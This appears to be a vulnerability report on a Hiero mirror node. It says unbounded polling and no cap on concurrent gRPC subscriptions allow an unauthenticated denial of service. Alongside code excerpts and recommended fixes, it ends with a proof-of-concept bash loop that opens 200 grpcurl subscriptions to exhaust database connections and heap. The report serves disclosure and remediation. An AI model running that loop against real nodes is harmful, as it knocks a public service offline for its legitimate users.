### Title
Unbounded Concurrent Subscriptions in `PollingTopicListener` Enable Unauthenticated Resource Exhaustion DoS

### Summary
`PollingTopicListener.poll()` issues a DB query for up to `maxPageSize=5000` rows every `interval=500ms` per active subscription, repeating `Long.MAX_VALUE` times with no enforced ceiling on concurrent subscribers. An unprivileged attacker can open arbitrarily many subscriptions with no `limit` and no `endTime`, each holding a polling loop open indefinitely, exhausting the DB connection pool and JVM heap until the mirror node becomes unavailable.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` schedules `poll()` to repeat `Long.MAX_VALUE` times:

```java
// PollingTopicListener.java lines 38-43
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .jitter(0.1)
                .withFixedDelay(interval)
                .withScheduler(scheduler))
``` [1](#0-0) 

Each `poll()` invocation computes `pageSize` as:

```java
// lines 54-57
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
``` [2](#0-1) 

When the attacker sends `limit=0` (the proto default, meaning unlimited), `filter.hasLimit()` returns `false`, so `limit = Integer.MAX_VALUE` and `pageSize = maxPageSize = 5000`. This DB query fires every 500ms for the lifetime of the subscription. [3](#0-2) 

**Root cause — no subscription gate:**

`TopicMessageServiceImpl` tracks `subscriberCount` only as a Micrometer gauge; it is never compared against any maximum before accepting a new subscription:

```java
// lines 52-55 — metric only, no enforcement
Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
        ...
        .register(meterRegistry);
``` [4](#0-3) 

The counter is incremented/decremented on subscribe/terminate but never checked: [5](#0-4) 

**`startTime` validation is insufficient:**

`TopicMessageFilter.isValidStartTime()` only rejects future timestamps; any past timestamp — including epoch — is accepted:

```java
// lines 48-51
@AssertTrue(message = "Start time must be before the current time")
public boolean isValidStartTime() {
    return startTime <= DomainUtils.now();
}
``` [6](#0-5) 

**Exploit flow:**

1. Attacker opens subscription N with `startTime = epoch`, `limit = 0`, no `endTime`, on a high-volume topic.
2. `TopicMessageServiceImpl.incomingMessages()` passes the adjusted `startTime` (after historical retrieval) to `topicListener.listen()`.
3. `PollingTopicListener` begins polling every 500ms, fetching 5000 rows per cycle from the DB via `Flux.fromStream(topicMessageRepository.findByFilter(newFilter))`.
4. On a high-volume topic the poller never catches up; each cycle returns a full page of 5000 rows, keeping the subscription alive indefinitely.
5. Attacker repeats with N concurrent connections. Each subscription holds a `boundedElastic` thread and a DB connection for the duration of each query. [7](#0-6) 

### Impact Explanation

Each concurrent subscription issues one DB query every 500ms returning up to 5000 rows (~30 MB if messages are near the 6 KB limit). With N=200 concurrent subscriptions the node issues 400 queries/s, each materialising up to 30 MB of heap, totalling up to 6 GB of live heap pressure per second. The DB connection pool (typically 10–50 connections) is saturated, causing all legitimate queries — including importer writes and REST API reads — to queue and time out. The mirror node process OOMs or becomes unresponsive, taking down the entire HCS subscription service. Because the gRPC port is publicly reachable and no authentication is required, this is trivially repeatable. [8](#0-7) 

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is unauthenticated and publicly documented. The attacker needs only a gRPC client (e.g., `grpcurl`), knowledge of one valid topic ID (obtainable from the REST API), and the ability to open many TCP connections. No credentials, no on-chain funds, and no brute force are required. The attack is repeatable from a single machine or a small botnet and is not mitigated by any existing server-side control visible in the codebase. [9](#0-8) 

### Recommendation

1. **Enforce a maximum concurrent subscriber count** in `TopicMessageServiceImpl.subscribeTopic()`: compare `subscriberCount` against a configurable ceiling before accepting a new subscription and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Enforce a minimum `startTime` depth** in `TopicMessageFilter.isValidStartTime()`: reject `startTime` older than a configurable maximum lookback (e.g., 24 hours) to prevent full-history scans via the live listener path.
3. **Add per-IP / per-client rate limiting** at the gRPC interceptor layer to cap the number of concurrent subscriptions per source address.
4. **Cap `maxPageSize`** with a hard upper bound in `ListenerProperties` and expose a per-subscription page-size limit so a single slow subscriber cannot monopolise DB bandwidth.
5. **Set a maximum subscription lifetime** (configurable `maxSubscriptionDuration`) after which the server terminates the stream with `DEADLINE_EXCEEDED`. [10](#0-9) 

### Proof of Concept

```bash
# Prerequisites: grpcurl installed, mirror node running in POLL listener mode,
# TOPIC_ID is any valid topic with ongoing message traffic.

# Step 1: Open 200 concurrent unlimited subscriptions from epoch
for i in $(seq 1 200); do
  grpcurl -plaintext \
    -d '{
      "topicID": {"shardNum": 0, "realmNum": 0, "topicNum": 1234},
      "consensusStartTime": {"seconds": 0, "nanos": 0}
    }' \
    <mirror-node-host>:5600 \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic \
    > /dev/null 2>&1 &
done

# Step 2: Observe on the server
# - DB connection pool saturated (connection wait timeouts in logs)
# - JVM heap climbing toward OOM (via JMX or /actuator/metrics)
# - hiero.mirror.grpc.subscribers gauge = 200 (metric confirms no cap)
# - Legitimate REST API queries begin timing out

# Step 3: Confirm no server-side rejection
# All 200 connections are accepted; none receive RESOURCE_EXHAUSTED or
# any error until the process crashes or the client disconnects.
``` [11](#0-10)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L34-48)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L54-57)
```java
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L61-61)
```java
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L21-30)
```java
    @Min(8192)
    @Max(65536)
    private int maxBufferSize = 16384;

    @Min(32)
    private int maxPageSize = 5000;

    @DurationMin(millis = 50)
    @NotNull
    private Duration interval = Duration.ofMillis(500L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L89-90)
```java
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L48-51)
```java
    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```

**File:** protobuf/src/main/proto/com/hedera/mirror/api/proto/consensus_service.proto (L47-49)
```text
service ConsensusService {
    rpc subscribeTopic (ConsensusTopicQuery) returns (stream ConsensusTopicResponse);
}
```
